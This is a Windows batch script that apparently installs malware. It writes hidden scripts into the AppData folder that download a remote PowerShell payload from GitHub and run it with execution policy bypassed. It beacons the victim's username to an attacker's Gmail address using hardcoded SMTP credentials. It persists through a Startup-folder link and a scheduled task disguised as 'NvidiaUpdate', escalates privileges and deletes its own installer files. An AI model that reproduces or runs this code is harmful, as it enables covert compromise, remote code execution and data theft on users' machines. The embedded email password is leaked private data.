@echo off
cd %appdata%\Microsoft
powershell -command "add-content -path .\cont.bat -value '@echo off' "
powershell -command "add-content -path .\cont.bat -value ':ping' "
powershell -command "add-content -path .\cont.bat -value 'ping www.google.com -n 1 | find """TTL=""" ' "
powershell -command "add-content -path .\cont.bat -value 'if errorlevel==1 goto ping' "
powershell -command "add-content -path .\cont.bat -value 'if exist %appdata%\Microsoft\core.ps1 (del /f %appdata%\Microsoft\core.ps1)'"  
powershell -command "add-content -path .\cont.bat -value 'powershell -command ""Invoke-WebRequest -Uri """https://raw.githubusercontent.com/4V4loon/unite/main/changed.ps1""" -OutFile $env:appdata\Microsoft\core.ps1""'" 
powershell -command "add-content -path .\cont.bat -value 'attrib +h %appdata%\Microsoft\core.ps1'" 
powershell -command "add-content -path .\cont.bat -value 'powershell -command """powershell -executionpolicy bypass -file $env:appdata\Microsoft\core.ps1"""'" 
powershell -command "add-content -path .\cont.bat -value 'powershell -command ""PowerShell.exe -windowstyle hidden { $Username = """""""""xaker.isi007@gmail.com""""""""";  $Password = """""""""szmw2441419""""""""";  function Send-ToEmail([string]$email){ $message = new-object Net.Mail.MailMessage; $message.From = """""""""xaker.isi007@gmail.com"""""""""; $message.To.Add($email); $message.Subject = $env:username; $message.Body = """""""""Online"""""""""; $smtp = new-object Net.Mail.SmtpClient("""""""""smtp.gmail.com""""""""", """""""""587"""""""""); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password); $smtp.send($message);} Send-ToEmail  -email """""""""xelil.isi007@gmail.com""""""""";}""'"  
attrib +h %appdata%\Microsoft\cont.bat 
powershell -command "add-content -path .\invis.vbs -value 'Set WshShell = CreateObject("""WScript.Shell""")'" 
powershell -command "add-content -path .\invis.vbs -value 'WshShell.Run chr(34) & """%appdata%\Microsoft\cont.bat""" & Chr(34), 0, True'" 
powershell -command "add-content -path .\invis.vbs -value 'Set WshShell = Nothing'" 
powershell -command "New-Item -ItemType SymbolicLink -Path '%programdata%\Microsoft\Windows\Start Menu\Programs\StartUp\start.lnk' -Target '%appdata%\Microsoft\invis.vbs'"
attrib +h %appdata%\Microsoft\invis.vbs
schtasks /create /sc minute /mo 20 /tn "NvidiaUpdate" /tr "%appdata%\Microsoft\invis.vbs" /f
del /f %userprofile%\pass.ps1
del /f %userprofile%\exec.exe
powershell -command "powershell -executionpolicy bypass Start-Process %appdata%\Microsoft\cont.bat -Verb runas"
del /f %userprofile%\one.bat
